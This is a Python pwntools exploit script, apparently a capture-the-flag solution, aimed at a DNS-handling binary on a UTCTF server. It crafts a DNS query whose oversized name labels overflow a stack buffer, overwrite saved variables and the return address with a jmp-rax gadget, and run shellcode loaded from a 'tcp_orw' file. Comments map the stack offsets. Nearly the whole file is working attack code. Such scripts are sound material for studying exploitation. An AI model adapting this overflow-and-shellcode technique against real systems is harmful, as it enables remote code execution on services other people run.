#!/usr/bin/env python

from pwn import *

context(arch="amd64")

#p = remote("127.0.0.1", 9000, typ="udp")
p = remote("binary.utctf.live", 54, typ="udp")
elf = ELF("./pwnable")

netsock = 3

with open("tcp_orw", "rb") as f:
	shellcode = f.read()

log.info("shellcode len: {}".format(len(shellcode)))

# generate payload to overwrite rip with data
bss_ptr = 0x603400
def gen_payload(data):
    """
    this is an A record request for 'asdf'

    \xc0\xd3 \x01\x20 \x00\x01   \x00\x00 \x00\x00  \x00\x01
    id       flags    questions  ans RRs  auth RRs  additional RRs

    \x04\x61\x73\x64\x66\x00 \x00\x01 \x00\x01 \x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00
    name                     type     class    additional queries
    """

    global bss_ptr

    # BIG ENDIAN BOI
    buf = ""
    buf += "no" # id
    buf += "\x01\x20" # flags
    buf += "\x00\x01" # qdCount
    buf += p16(0) # anCount, == 0
    buf += p16(0) # nsCount, == 0
    buf += p16(0) # additional RRs

    # need to build n messages of <256 bytes each

    # first name piece: shellcode byte and fake stack frame
    # this ptr is in rax when the function returns
    first = ""
    first += data

    assert(len(first) < 256)
    while len(first) < 255:
        first += "a"

    buf += p8(len(first)) + first

    # second name piece is 0x100 away from base (rbp-0x20)
    # this puts us right at saved rip
    # j @ rbp-0x4
    # i @ rbp-0x8
    # buf @ rbp-0x10
    # len @ rbp-0x14
    # name @ rbp-0x120
    second = ""
    second += "c"*0xc # offset
    second += p32(0) # len
    second += p64(0x603800) # buf; this points to empty .bss (rwx)
    second += p32(0) # i
    second += p32(0x100) # j; this becomes RDX + 1
    second += p64(0) # saved rbp

    log.info("available space in second chunk: {}".format(0x100-len(second)-4))

    jmp_rax = 0x400a45

    # rop
    second += p64(jmp_rax)

    assert(len(second) < 0x100)

    buf += p8(len(second))
    buf += second
    buf += "\x00"

    # set end of query info
    buf += "\x00\x01" # type
    buf += "\x00\x01" # class

    log.info("dns request length: {}".format(len(buf)))

    return buf

p.sendline(gen_payload(shellcode))
